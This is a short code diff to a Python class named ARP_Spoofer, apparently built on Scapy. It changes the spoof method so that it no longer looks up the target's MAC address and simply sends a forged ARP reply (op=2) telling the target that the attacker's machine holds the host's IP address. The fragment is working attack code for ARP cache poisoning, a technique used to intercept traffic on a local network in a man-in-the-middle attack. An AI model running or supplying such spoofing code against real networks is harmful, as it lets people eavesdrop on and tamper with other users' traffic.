@@ -70,10 +70,8 @@ class ARP_Spoofer:
             return None
 
     def spoof(self, target_ip, host_ip):
-        target_mac = self.get_mac(target_ip)
-        if not target_mac:
-            return
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
+
+        packet = ARP(op=2, pdst=target_ip, psrc=host_ip)
         send(packet, verbose=False)
 
     def restore(self, destination_ip, source_ip):
